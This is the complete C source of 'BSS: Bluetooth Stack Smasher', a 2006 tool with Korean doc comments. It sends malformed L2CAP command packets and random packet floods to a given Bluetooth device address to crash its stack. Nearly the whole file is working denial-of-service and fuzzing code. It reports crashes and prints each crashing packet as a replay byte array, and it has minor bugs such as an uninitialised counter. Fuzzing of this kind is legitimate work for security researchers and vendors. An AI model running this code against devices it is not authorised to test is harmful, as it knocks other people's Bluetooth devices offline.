/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

/**
 * l2dos - 특정 Bluetooth 장치를 대상으로 L2CAP command packets를 fuzzing하는 함수
 * 
 * @param bdstr_addr: 공격할 Bluetooth 장치의 주소 (문자열 형태)
 * @param cmdnum: 수행할 L2CAP 명령 코드 (정수)
 * @param siz: 보낼 패킷의 크기 (정수)
 * @param pad: 패킷 데이터를 채울 패딩 문자 (문자)
 * 
 * 이 함수는 Bluetooth 소켓을 열고, 주어진 장치 주소와 연결한 후, 
 * 특정 L2CAP 명령 코드를 포함하는 패킷을 생성하여 fuzzing을 수행합니다.
 * 패킷은 주어진 크기와 패딩 문자로 채워지고, 여러 번 전송됩니다.
 * 패킷 전송 도중 에러가 발생하면 해당 장치가 취약할 수 있음을 보고합니다.
 */
void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
{
	char *buf;
	l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
	struct sockaddr_l2 addr;
	int sock, i, id;
	char *strcode = NULL;
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.l2_bdaddr);
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(buf = (char *) malloc ((int) siz))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	for(i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
	{
		if( pad == 0 )
			buf[i] = 0x41;		/* Default padding byte */
		else
			buf[i] = pad;
	}
	
	fprintf(stdout, "size = %d\n",siz);
	strcode = code2define(cmdnum);
	if(strcode == NULL)
	{
		perror("L2CAP command unknown");
		exit(EXIT_FAILURE);
	}
	else
		fprintf(stdout, "Performing \"%s\" fuzzing...\n",strcode);

	for(i = 0; i < IT; i++){			// Send IT times the packet thru the air
		cmd = (l2cap_cmd_hdr *) buf;
		cmd->code = cmdnum;
		cmd->ident = (i%250) + 1;		// Identificator 
		cmd->len = __cpu_to_le16(LENGTH);

		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, siz?siz:MAXSIZE, 0) <= 0)
		{
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t ----------------------------------------------------\n");
			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\t Code field\t%s\n", strcode);
			fprintf(stdout, "\t Ident field\t%d\n", id);
			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
			fprintf(stdout, "\t Packet size\t%d\n", siz);
			fprintf(stdout, "\t ----------------------------------------------------\n");
		}
		if(++id > 254)
			id = 1;
	}

	free(strcode);	
}

/**
 * l2fuzz - Bluetooth L2CAP 프로토콜을 사용하여 취약점을 테스트하는 함수
 * 
 * 이 함수는 Bluetooth L2CAP 프로토콜을 통해 대상 장치로 임의의 데이터를 전송하여
 * 장치가 충돌(crash)을 일으키는지 테스트합니다.
 * 
 * @param bdstr_addr 대상 블루투스 장치의 주소 문자열
 * @param maxsize 전송할 패킷의 최대 크기
 * @param maxcrash 최대 충돌 횟수 (0일 경우 무한정)
 * 
 * 함수 설명:
 * 1. Bluetooth RAW 소켓을 생성하고, 주소 구조체를 초기화합니다.
 * 2. 소켓을 통해 대상 블루투스 장치에 연결을 시도합니다.
 * 3. 무한 루프를 통해 임의의 크기의 패킷을 생성하고 전송합니다.
 * 4. 패킷 전송 후 장치가 충돌할 경우 충돌 횟수를 증가시키고, 해당 패킷 정보와 함께 충돌 메시지를 출력합니다.
 * 5. 설정된 최대 충돌 횟수에 도달하면 프로그램을 종료합니다.
 * 6. 각 패킷 전송 후 마지막으로 전송한 패킷을 저장하여 이후 충돌 발생 시 해당 패킷을 참조할 수 있도록 합니다.
 */
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
{
	char *buf, *savedbuf;
	struct sockaddr_l2 addr;
	int sock, i, size;
	int crash_count=0, savedsize;
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.l2_bdaddr);
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(savedbuf = (char *) malloc ((int) maxsize + 1))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	while(1)		// Initite loop (ctrl-c to stop...)
	{
		size=rand() % maxsize;
		if(size == 0) 
			size=1;
		if(!(buf = (char *) malloc ((int) size + 1))) {
			perror("malloc");
			exit(EXIT_FAILURE);
		}

		bzero(buf, size);
		for(i=0 ; i<size ; i++)	
			buf[i] = (char) rand();
		
		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, size, 0) <= 0)
		{
			crash_count++;
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bdstr_addr);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tHost\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\tPacket size\t%d\n", savedsize);
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tPacket dump\n\t");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[i]);
				if( (i%30) == 29)
					fprintf(stdout, "\n\t");
			}
			fprintf(stdout, "\n\t----------------------------------------------------\n");

			fprintf(stdout, "char replay_buggy_packet[]=\"");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[i]);
			}
			fprintf(stdout, "\";\n");

			if((crash_count == maxcrash) && (maxcrash != 0) && (maxcrash >= 0))
			{
				free(buf);
				free(savedbuf);
				exit(EXIT_SUCCESS);
			}
			
		}
		memcpy(savedbuf, buf, size);	// Get the previous packet, not this one...
		savedsize = size;
		free(buf);
	}
}

/**
 * usage - 프로그램 사용법을 출력하고 프로그램을 종료합니다.
 *
 * @name: 프로그램 실행 파일의 이름
 *
 * 이 함수는 프로그램의 사용법에 대한 정보를 표준 오류 출력(stderr)에
 * 출력하고,(EXIT_FAILURE) 값을 반환하여 실행을 종료시킵니다.
 * 사용법 정보에는 사용할 수 있는 명령줄 인자와 모드에 대한 설명이 포함되어 있습니다.
 */
int usage(char *name)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", name);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");	
	exit(EXIT_FAILURE);
}


/**
 * code2define - 주어진 코드에 해당하는 L2CAP 메시지 문자열을 반환하는 함수
 * 
 * @param code: L2CAP 메시지 코드 (정수 값)
 * 
 * @return code에 해당하는 L2CAP 메시지의 문자열 설명 
 *         (성공시 동적으로 할당된 문자열, 실패시 NULL)
 * 
 * 이 함수는 주어진 code 값에 따라 해당되는 L2CAP 메시지의 
 * 문자열 설명을 반환합니다. 성공적으로 매핑된 경우 동적으로 할당된 
 * 문자열을 반환하며, 매핑 실패 시 NULL을 반환합니다. 
 * 사용자는 반환된 문자열에 대해 메모리 해제를 수행하여야 합니다.
 */
char *code2define(int code)
{
	char *strcode= malloc(BUFCODE + 1);
	switch(code)
	{
		case L2CAP_ECHO_REQ:
			strcpy(strcode, "L2CAP echo request");	
			break;

		case L2CAP_COMMAND_REJ:
			strcpy(strcode, "L2CAP command reject");	
			break;
			
		case L2CAP_CONN_REQ:
			strcpy(strcode, "L2CAP connection request");	
			break;
			
		case L2CAP_CONN_RSP:
			strcpy(strcode, "L2CAP connexion response");	
			break;
			
		case L2CAP_CONF_REQ:
			strcpy(strcode, "L2CAP configuration request");	
			break;
			
		case L2CAP_CONF_RSP:
			strcpy(strcode, "L2CAP configuration response");	
			break;
			
		case L2CAP_DISCONN_REQ:
			strcpy(strcode, "L2CAP disconnection request");	
			break;
			
		case L2CAP_DISCONN_RSP:
			strcpy(strcode, "L2CAP disconnection response");	
			break;
			
		case L2CAP_ECHO_RSP:
			strcpy(strcode, "L2CAP echo response");	
			break;
			
		case L2CAP_INFO_REQ:
			strcpy(strcode, "L2CAP info request");	
			break;
			
		case L2CAP_INFO_RSP:
			strcpy(strcode, "L2CAP info response");	
			break;
			
		default:
			strcode=NULL;
	}
	return strcode;
}

/**
 * @brief 프로그램의 진입점. 블루투스 디바이스에 패킷을 보내어 테스트를 수행합니다.
 *
 * @param argc 명령줄 인수의 개수
 * @param argv 명령줄 인수 배열
 *
 * @details
 * 1. 프로그램은 root 권한으로 실행되어야 합니다.
 * 2. 명령줄 인수가 올바르게 제공되지 않은 경우 사용법을 출력하고 종료합니다.
 * 3. 블루투스 주소와 옵션을 명령줄 인수에서 분석합니다.
 * 4. 모드에 따라 l2dos 혹은 l2fuzz 함수를 호출하여 블루투스 장치에 패킷을 보냅니다.
 * 5. 테스트가 완료되면 종료 메시지를 출력하고 프로그램을 종료합니다.
 *
 * @return 프로그램이 정상적으로 종료되면 EXIT_SUCCESS를 반환
 */

int main(int argc, char **argv)
{
	int i, siz = 0, mode = 0, maxcrash=1;
	char bdaddr[20], pad=0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(i = 0; i < argc; i++){
		if(strchr(argv[i], ':'))
			strncpy(bdaddr, argv[i], 18);
		else
		{
		if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
			usage(argv[0]);

		}
	}

	if(mode > 12)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if(mode == 0)
	{
		for(i=1; i <= 0x0b; i++)
			l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);
		l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
	}
	else
	{
		if(mode <= 11)
			l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);
		if(mode == 12)
			l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
	}
	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
